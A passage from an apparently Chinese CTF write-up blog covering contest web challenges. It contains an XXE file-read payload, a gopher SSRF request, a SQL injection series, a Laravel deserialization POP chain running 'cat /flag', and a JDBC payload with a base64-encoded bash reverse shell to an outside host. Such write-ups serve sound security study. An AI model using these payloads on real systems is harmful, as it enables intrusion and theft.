ob_get_contents();</span><br><span class="line">    ob_end_clean();  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div.main&#123;</span><br><span class="line">    width:<span class="number">90</span>%;</span><br><span class="line">    max-width:<span class="number">50</span>%;</span><br><span class="line">    margin:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">textarea&#123;</span><br><span class="line">    width:<span class="number">100</span>%;</span><br><span class="line">    height:<span class="number">100</span>%;</span><br><span class="line">&#125;</span><br><span class="line">input[type=<span class="string">"submit"</span>]&#123;</span><br><span class="line">    margin: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class="main"&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">"data"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ($data!=<span class="keyword">false</span>)?htmlspecialchars($data):htmlspecialchars(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input style=<span class="string">""</span> type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a target=<span class="string">"_blank"</span> href=<span class="string">"&lt;?php echo basename(__FILE__).'?s';?&gt;"</span>&gt;View Source Code&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hints.php</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">#there is an main.php</span></span><br><span class="line"><span class="meta">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="meta">#“那你给我算一个出来”</span></span><br><span class="line"><span class="meta">#“好的”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="meta">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="meta">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="meta">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="meta">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#“咱们对一下数字？”</span></span><br><span class="line"><span class="meta">#‭10122047934126‬</span></span><br><span class="line"><span class="meta">#10122047934126</span></span><br><span class="line"><span class="meta">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure><p>根据这里hints.php的内容提示，win10的计算器鼠标直接复制后，会在数字的前后加上两个不可见的unicode字符%e2%80%ad和%e2%80%ac，在这里的<code>unserialize($_GET[&#39;‬&#39;])</code>部分，测试后发现可以用<code>%e2%80%ac=123</code>传参内容。<br>到这一步按照预期应该是利用两个类的反序列化操作去想办法读取flag.txt内容了，但是其实回过头看看，xxe.php已经能够任意文件读取了不是吗？</p><ol><li><p>url编码绕过</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];  <span class="comment">#不会对url解码，所以直接绕过过滤</span></span><br></pre></td></tr></table></figure><p> payload</p><p> <code>a=%66%69%6c%65:///var/www/html/%66%6c%61%67.php&amp;b=%66%69%6c%65:///var/www/html/%6 6%6c%61%67.php</code></p><p> <img src="/2020/06/第四届第五空间安全大赛/image-20200626110638762.png" alt="image-20200626110638762"></p></li><li><p>gopher</p><p> SSRF 利用 gopher 模拟 POST 请求，访问 xxe.php，然后利用 xxe 来读文件</p><p> index.php 用的过滤函数是 preg_match</p><p> 而在 xxe.php 里用的是 replace</p> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,<span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure><p> 那么可以直接用 双写的方式来 bypass, 类似这样：</p> <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flreadag</span>   ==&gt; preg_replace(<span class="string">"/flag/i"</span>, <span class="string">''</span>, <span class="variable">$data</span>) ==&gt; flag</span><br></pre></td></tr></table></figure><p> 接着xxe读取文件</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ureadtf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/rereadad=convert.base64-encode/resource=flreadag.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>先URL编码下，谁便POST一下获取<code>Content-Length</code></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120356953.png" alt="image-20200626120356953"></p><p>然后将data再URL编码两次(用PHP函数)</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120455719.png" alt="image-20200626120455719"></p><p>payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520611%250D%250A%250D%250Adata%253D%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br></pre></td></tr></table></figure><h3 id="3-zzm’s-blog"><a href="#3-zzm’s-blog" class="headerlink" title="3.zzm’s blog"></a>3.<strong>zzm’s blog</strong></h3><p>根据题目给的pom.xml</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626132854601.png" alt="image-20200626132854601"></p><p>和这篇<a href="https://b1ue.cn/archives/189.html#pom.xml" target="_blank" rel="noopener">文章</a>jdbc url可以指定导致rce</p><p>先搭一个<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">恶意的mysql服务器</a>和JAVA序列化的工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133727220.png" alt="image-20200626133727220"></p><p>接着监听端口</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133825721.png" alt="image-20200626133825721"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:[<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>, <span class="string">"jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mICAgL2Rldi90Y3AvMS4xLjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200626133930336.png" alt="image-20200626133930336"></p><h3 id="4-美团外卖"><a href="#4-美团外卖" class="headerlink" title="4.美团外卖"></a>4.<strong>美团外卖</strong></h3><p><code>www.zip</code>源码泄露</p><p>在daochu.php存在注入</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">true$biao=<span class="string">'content'</span>;</span><br><span class="line">true$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span> //字段数为<span class="number">6</span></span><br></pre></td></tr></table></figure><p>回显4，6，2, 3</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627101937077.png" alt="image-20200627101937077"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(schema_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata<span class="symbol">%23</span>  //数据库名</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102635262.png" alt="image-20200627102635262"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='cms'<span class="symbol">%23</span>   //表</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627102842991.png" alt="image-20200627102842991"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>d'cms'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name<span class="symbol">%3</span>d'hint'<span class="symbol">%23</span> //字段</span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104512801.png" alt="image-20200627104512801"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(hints)<span class="symbol">%20</span>from<span class="symbol">%20</span>hint<span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627104803417.png" alt="image-20200627104803417"></p><p>开始不能访问的<code>/lib/webuploader/0.1.5/server/preview.php</code>加上这个目录就行了，POST数据就行</p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105703977.png" alt="image-20200627105703977"></p><p><img src="/2020/06/第四届第五空间安全大赛/image-20200627105855419.png" alt="image-20200627105855419"></p><h3 id="5-laravel"><a href="#5-laravel" class="headerlink" title="5.laravel"></a>5.<strong>laravel</strong></h3><p><code>./artisan -v</code>  得到版本 <code>Laravel Framework 5.7.28</code></p><p>5.7.X版本存在一个反序列化漏洞,根据<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">文章</a>查看源码发现 <code>vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code>的 <code>run</code>方法被删除了，只能找其他链子</p><p>然后根据这篇<a href="https://www.anquanke.com/post/id/184541#h3-2%E3%80%82" target="_blank" rel="noopener">文章</a></p><p>根据文件对比工具</p><p><code>app\Http\Controllers\TaskController.php</code>有个反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">true <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">truetrue unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">true &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>routes\web.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure><p>POP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"> <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line"> <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"> $<span class="title">a</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>("<span class="title">addCollection</span>" =&gt; "<span class="title">system</span>"));</span><br><span class="line"> $b = <span class="keyword">new</span></span><br><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      摸鱼
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记一次学校的内网漫游</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/</id>
    <published>2020-06-17T16:05:43.000Z</published>
    <updated>2020-06-22T06:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2706c09d50f1b81254cde7910bae439a8bf11e165a8bf0bcbcce1f1116625824">541ed2b57286a70f48aa3dc8388e3d2e4d3d46358ec5f2566a287e4d36f58a2f35233e595cba68e8068af1d85b170aaccb3cd36640260e5f6b6640d9da0e9220bb192a9753b6882cfdae737d326360af37d496eb657fc3ba70468f9c8aec91df79953449547c9a996f2a3b9a3b285b90713db3f1abf68067b0d79a367fcb86f8026664716b7815fdf99d7c0194b59fd579084b41ab3a3731903a55301c3e5f2980a4d921850604b107705e236e6b69a275949a063a2f487cb491133b6876534aab9353c5d69af8b521f8238d8d37fa950022dae7e95ef465d9cdf9d8b2f5a4f8d98c547e0f891f27fbe0e4e7d34d6875eecfad44e1f90249da751bec3858806615c44016c31f9a7f48e466be120e6749a3af560874876a046407dc3a0524cb4ab06ef695c65a4a382843deadc4bde04d5d72d0c220192d8aeb3a4cea9bb39a1fa1151c8ac3fd62dbb4af79d06c8f7b92cc826a8d48490a36ac6046f3679ab733fb3d5387a96699b000db9d4e16fc3a069b5610a837cb7748ee31a69fe5073785385847b4e3c815160eac23faf00b258f36b404cf3a58a9bae7477db758ccf479845509e514a28c454e1661ea361631b5d393953a7a7687081bb9a40ab46100f828e9d758f4bcd77a76d58656acb986d20b0da022ee13a33ea9c7cfb14bc28e8606855146559e9aca77563fcc8deabbf2fe3554f0de5f749b6511e63933225acbd43cec9edf4ab5f47c12ba54ff4e649752a1d2489856904be15adfded049a0f6dbcda5aec4c6939b852ed2c59c06ce9fd198a905f499b0c56d85dfbd91d857f76b00ac807d3748f6e3a5879bfe157a5c40e4d16ed4bcb16085ec8d12841ed7ee49c642173494b5868a182fa349e52cb98f78b50afc7beedfafcb361bcacaf7918f8b66d2ba83797681c2628c432e2c86851386ab46cc51250e375805140d2bdca56e77688683c225bbb9cfeb111fb94c44a3e850cf0f6ad4650ac28a54e9d59a003ca53ae702ad6934f37fa9e976e76221463f2d1ca4d4217255621fc49ec4219f7e04d9dc050633fd608df93b6f70dd68fedf016eec992b1deecec8a85d00154f1cdeffedd084603008d0d72a8cd6b42942b760c38567f85058eaa79ee1834ec9992b3e92115561e42f5e28adf6dc5c7701f70970f57468b4d28db570166e9973f573cedf083446a38b8a22cf5cbedbcb1519167815662eb706e5f07ba8592ee42e18a69fa1b883ce60cdbed61fdac158bfbc0afcca50c2c0620c19851769ea7b2bb7fc47f7c4c972dde04510348f1f525e04ef6fcb5b0ae8b9563dbc6667c39a497e47c616f5e4f29f413443a5173e65c2956f8ccbb668337279952acf8551b0f06038bf3481068836efb963f373e294e15164ef29ded3188f1b50e62d3564a880c3233af2b970f9b51a054fed3f5ab73f058181db95c7fda2a660ac5a12f5d49ecff4bce428dc98cbf82723adb0dc3718f4990712d7ea0c7e255abf660393a878d5539604c88806cd8ca727718739d27e6a6a6fb0d410af4eb24e9fcb8905e1eafbec35dde774c4ac0531b9d728f4a627cc68dd69454208e926a3c5d027299353ce697894a4c1c95742165010fc16e9c4a657bddb311d3261c91718f9cbcff4e8e1fb86f805fddd3d6d52448982c0e706e7c98ac4c124080c59b318b624d22dd8bd3ab7fcd4880f4bef6784f9954994852a47844d162029888fcb1e3551d3b25803f0fb1114ee1506ab68674f5ddb7c652855787d32abc645926e397b175ebbaa4a6d24fd3273dcbbe6a0afba12d47c83998a78c648f2b9f2f01628b06a04e26c0a8c19f49ca6aeff6f35544d52c2deb0c033d5f5af1838b21ffdc0c2c2cbecd700696d43899fbbedf4b2f6a1deb790bf5da1bef09a8f9ebb9d80fb6b56ae383a3993ea95db7359a811eb347fc9ca773c8b83ad2faf8a1a73c0ebca1cfd73391fe7f87b3d7d9f108080713db14de35467614e320a1eed2976aebad516879f6ae5e595c99444bab112452d339260e010f643f29bf0146309eadf88d68a4e38accfe86b55811488af25d107c4c1204fa379b24f99702a6cd53a67b3c241e2cb3231bc493ba3a8e3f446f4e009496ff1204e3d989ac62e43b90c2851d733561505f1c78d1200facc665cd9bc4f206a51e89015473505df59c9d6dbee7d3bb8fde0600b05e69c4c24208ca193e7519b28e6169681152c3e90c294a11366ce58b868f35d0d4c510c350be08eefa8514313f19fdb82a5545bd12ca81f4455d0cad5012b7fcc43b18bec1768ccacaa8d3b30bd4faef4da853e28f0f6cca2adde21c235ca2e09858e62a7baa2424d87bdd188d9511639e31a0b9e7ec03682daa597c